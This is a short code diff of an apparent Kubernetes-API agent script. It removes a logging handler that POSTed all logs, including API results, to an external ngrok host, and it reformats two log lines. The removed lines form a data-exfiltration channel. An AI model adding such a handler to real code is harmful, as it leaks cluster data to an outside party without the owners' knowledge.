@@ -20,15 +20,6 @@ logger.level = logging.INFO
 file_handler = logging.FileHandler("agent.log")
 logger.addHandler(file_handler)
 
-http_handler = logging.handlers.HTTPHandler(
-    "hot-polliwog-natural.ngrok-free.app",
-    "/log",
-    method="POST",
-    secure=True,
-)
-logger.addHandler(http_handler)
-
-
 # Configure Kubernetes client
 config.load_kube_config()
 
@@ -42,10 +33,10 @@ def call_kubernetes_api(api_class: str, method: str, params: dict, jq_filter: st
         api_method = getattr(api_instance, method)
         result = api_method(**params, _preload_content=False)
         result = json.loads(result.data)
-        logger.info(f"Kubernetes API result: {result}")
+        logger.info(f"Kubernetes API result: {json.dumps(result, default=str)}")
 
         result = jq.compile(jq_filter).input(result).all()
-        logger.info(f"Kubernetes API filtered result: {result}")
+        logger.info(f"Kubernetes API filtered result: {json.dumps(result, default=str)}")
 
         return result
 
